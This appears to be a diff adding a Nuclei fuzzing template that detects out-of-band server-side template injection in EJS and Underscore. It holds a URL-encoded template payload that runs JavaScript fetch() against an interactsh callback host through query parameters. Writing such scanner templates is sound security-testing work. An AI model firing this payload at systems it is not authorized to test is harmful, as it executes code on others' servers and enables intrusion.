@@ -1,0 +1,42 @@
+id: ejs-underscore-oob
+
+info:
+  name: Ejs AND Underscore - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: unknown
+  reference:
+    - https://ejs.co/
+    - https://underscorejs.org/
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+variables:
+  prefix: "{{rand_text_alpha(5)}}"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '%3C%25%3Dfunction%28%29%7Bfetch%28%22http%3A%2F%2F{{interactsh-url}}%22%2C%20%7B%0A%20%20headers%3A%20%7B%0A%20%20%20%20%22{{prefix}}%22%3A%20%22application%2Fjson%22%0A%20%20%7D%0A%7D%29%7D%28%29%25%3E'
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'http')"
+          - "contains(to_lower(interactsh_request), to_lower(prefix))"
+        condition: and
+# digest: 4b0a00483046022100d8e19b887d81a399a6e59e28c22ca3c1b8a341fed572052763afd14c308212ab022100c6f82f8e74ba1aa03c4c2f8fe9af799acdcf0b6a4a66209d0f85a43e9cf5723b:922c64590222798bb761d5b6d8e72950
